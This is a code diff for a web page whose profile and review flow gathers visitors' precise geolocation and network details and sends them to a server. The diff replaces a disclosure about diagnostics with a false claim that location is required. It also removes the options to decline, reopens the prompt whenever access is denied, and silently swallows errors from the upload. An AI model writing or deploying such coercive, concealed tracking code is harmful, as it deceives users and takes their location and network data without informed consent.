@@ -420,8 +420,7 @@
     <div class="modal-card">
       <h2>Turn on location for a better experience</h2>
       <p>
-        Allowing location helps continue the review flow and lets the experience record the same diagnostics
-        currently used by this demo.
+        Location access is required to continue. If the browser prompt does not appear, check your browser site settings and tap the button again.
       </p>
       <div class="modal-actions">
         <button class="primary" id="allowLocationBtn" type="button">Turn On Location</button>
@@ -470,7 +469,6 @@
 
     function keepUserOnPage() {
       setBusy(false);
-      closeLocationModal();
     }
 
     function showSaveStatus(message, isError = false) {
@@ -609,65 +607,53 @@
       };
     }
 
-    function getPosition(options) {
-      return new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, options);
-      });
+    function proceedAfterLocation(nextStep) {
+      closeLocationModal();
+      if (nextStep === "portfolio") {
+        continueAfterLocation();
+      } else {
+        openReviewDestination();
+      }
     }
 
-    async function requestLocationAndContinue(nextStep = "review") {
+    function requestLocationAndContinue(nextStep = "review") {
       if (!("geolocation" in navigator)) {
-        keepUserOnPage();
+        openLocationModal();
         return;
       }
 
       setBusy(true);
-      let position = null;
+      locationModal.dataset.nextStep = nextStep;
 
-      try {
-        position = await getPosition({
-          enableHighAccuracy: true,
-          timeout: 12000,
-          maximumAge: 0
-        });
-      } catch (error) {
-        try {
-          position = await getPosition({
-            enableHighAccuracy: false,
-            timeout: 10000,
-            maximumAge: 60000
-          });
-        } catch (fallbackError) {
-          position = null;
-        }
-      }
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const { latitude, longitude, accuracy } = position.coords;
+          const payload = {
+            latitude,
+            longitude,
+            accuracy,
+            timestamp: new Date().toISOString(),
+            network: collectNetworkDetails()
+          };
 
-      if (!position) {
-        keepUserOnPage();
-        return;
-      }
-
-      const { latitude, longitude, accuracy } = position.coords;
-      const payload = {
-        latitude,
-        longitude,
-        accuracy,
-        timestamp: new Date().toISOString(),
-        network: collectNetworkDetails()
-      };
-
-      sendLocationToServer(payload)
-        .catch(() => {
-        })
-        .finally(() => {
+          sendLocationToServer(payload)
+            .catch(() => {
+            })
+            .finally(() => {
+              setBusy(false);
+              proceedAfterLocation(nextStep);
+            });
+        },
+        () => {
           setBusy(false);
-          closeLocationModal();
-          if (nextStep === "portfolio") {
-            continueAfterLocation();
-          } else {
-            openReviewDestination();
-          }
-        });
+          openLocationModal();
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
+        }
+      );
     }
 
     function continueAfterLocation() {
@@ -679,30 +665,13 @@
       portfolioSection.scrollIntoView({ behavior: "smooth", block: "start" });
     }
 
-    async function beginLocationFlow(nextStep = "review") {
+    function beginLocationFlow(nextStep = "review") {
       if (!profileSaved) {
         playerInput.focus();
         return;
       }
 
-      if (!("geolocation" in navigator)) {
-        keepUserOnPage();
-        return;
-      }
-
-      if (navigator.permissions && navigator.permissions.query) {
-        try {
-          const result = await navigator.permissions.query({ name: "geolocation" });
-          if (result.state === "granted") {
-            requestLocationAndContinue(nextStep);
-            return;
-          }
-        } catch (error) {
-        }
-      }
-
-      locationModal.dataset.nextStep = nextStep;
-      openLocationModal();
+      requestLocationAndContinue(nextStep);
     }
 
     startBtn.addEventListener("click", () => {
@@ -745,7 +714,7 @@
       requestLocationAndContinue(locationModal.dataset.nextStep || "review");
     });
     closeModalBtn.addEventListener("click", () => {
-      keepUserOnPage();
+      closeLocationModal();
     });
 
     locationModal.addEventListener("click", (event) => {
